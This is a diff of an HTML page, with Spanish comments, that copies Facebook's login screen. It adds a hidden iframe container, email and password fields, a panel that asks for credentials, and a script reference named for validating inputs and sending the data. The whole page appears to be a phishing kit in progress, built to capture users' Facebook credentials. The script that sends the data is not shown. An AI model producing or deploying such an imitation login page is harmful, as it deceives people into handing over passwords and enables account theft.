@@ -9,7 +9,14 @@
   </head>
   
   <body style="margin: 0px 0px 0px 0px; font-family: Helvetica, Arial, sans-serif; font-size: 12px;">
-    <!-- Caja de imagen de facebook, correo y contraseña -->
+    <div id="boxSuper" style="margin: 0px;">
+	
+	<!-- caja para el iframe hidden -->
+	<div id="boxIframeBD" style="display: none;">
+	
+	</div>
+	
+	<!-- Caja de imagen de facebook, correo y contraseña -->
     <!-- ################################## -->
     <div style="background-color: #465aa6; height: 82px; margin: 0px 0px 0px 0px;">
       <!-- Contenido de la caja -->
@@ -37,14 +44,14 @@
             <!-- segunda fila -->
             <tr>
               <td style="padding-bottom: 4px; padding: 0 0 0 14px;">
-                <input id="email" type="email" style="direction: ltr; border-color: #1d2a5b; width: 142px; padding-bottom: 4px; border: 1px solid #ccd0d5; padding: 3px; border-color: #1d2a5b;">
+                <input id="email1" type="email" style="direction: ltr; border-color: #1d2a5b; width: 142px; padding-bottom: 4px; border: 1px solid #ccd0d5; padding: 3px; border-color: #1d2a5b;">
               </td>
               <td style="padding-bottom: 4px; padding: 0 0 0 14px;">
-                <input id="pass" type="password" style="direction: ltr; border-color: #1d2a5b; width: 142px; padding-bottom: 4px; border: 1px solid #ccd0d5; padding: 3px; border-color: #1d2a5b;">
+                <input id="pass1" type="password" style="direction: ltr; border-color: #1d2a5b; width: 142px; padding-bottom: 4px; border: 1px solid #ccd0d5; padding: 3px; border-color: #1d2a5b;">
               </td>
               <td>
                 <label id="login" for="btn-login" style="direction: ltr;padding-bottom: 4px;border: 1px solid #ccd0d5; background-color: #4267b2;padding: 2px 6px 2px 6px;border-color: #1d2a5b;border-radius: 2px;cursor: pointer;display: inline-block;font-size: 12px;font-weight: bold;line-height: 18px;text-align: center;text-decoration: none;text-shadow: none;vertical-align: top;width: auto;white-space: nowrap;">
-                 <input id="btn-login" aria-label="Entrar" type="submit" value="Entrar" style="color: #fff; background: none; border: 0px; cursor: pointer; display: inline-block; font-weight: bold; padding: 0;">
+                 <button id="btn-login" style="color: #fff; background: none; border: 0px; cursor: pointer; display: inline-block; font-weight: bold; padding: 0;">Enviar</button>
                </label>
               </td>
             </tr>
@@ -80,7 +87,7 @@
     </div>
 
 <!-- texto y campos para la solicitud de credenciales-->
-<div style="margin-bottom: 15px;padding-left: 20px;padding-right: 20px;padding-top: 10px;">
+<div id="cajaCredenciales" style="margin-bottom: 15px;padding-left: 20px;padding-right: 20px;padding-top: 10px; height: 97.6px; width: 555px;">
     <div style="margin-top: 10px;margin-bottom: 10px;">
      [frase descriptiva: por confirmar]
     </div>
@@ -103,11 +110,12 @@
 
 <!-- botones -->
 <!-- para los botones de confirmacion y cancelar -->
-		<div style="padding: 8px 10px;border-bottom: none;border-left: none;border-right: none;background-color: #f2f2f2;border: 0px solid #ccc;height: 25px;border-top: 1px solid #ccc;">
+		<div id="cajaBotones" style="padding: 8px 10px;border-bottom: none;border-left: none;border-right: none;background-color: #f2f2f2;border: 0px solid #ccc;height: 25px;border-top: 1px solid #ccc;">
 			<div>
 				<div style="float: right;">
-					<button type="submit" style="background-color: #4267b2;border-color: #4267b2;color: #fff;line-height: 26px;border: 1px solid #ccd0d5;border-radius: 2px;font-weight: bold;padding: 0 6px;cursor: pointer;">[btn: confirmar]</button>
-					<button type="submit" style="margin-left: 4px;line-height: 26px;background-color: #f5f6f7;border: 1px solid #ccd0d5;border-radius: 2px;color: #4b4f56;font-weight: bold;padding: 0 6px;cursor: pointer;vertical-align: middle;">[btn: cancelar]</button>
+					<button id="btnConfirmacion" style="background-color: #4267b2;border-color: #4267b2;color: #fff;line-height: 26px;border: 1px solid #ccd0d5;border-radius: 2px;font-weight: bold;padding: 0 6px;cursor: pointer;">[btn: confirmar]</button>
+					<button id="btnCancelar" style="margin-left: 4px;line-height: 26px;background-color: #f5f6f7;border: 1px solid #ccd0d5;border-radius: 2px;color: #4b4f56;font-weight: bold;padding: 0 6px;cursor: pointer;vertical-align: middle;">[btn: cancelar]</button>
+					<script type="text/javascript" src="js/validacionInputs-enviarDatos.js"></script>
 				</div>
 			</div>
 		</div>            
@@ -118,6 +126,6 @@
     </div>
 </div>
     
-    
+    </div>
   </body>
 </html>
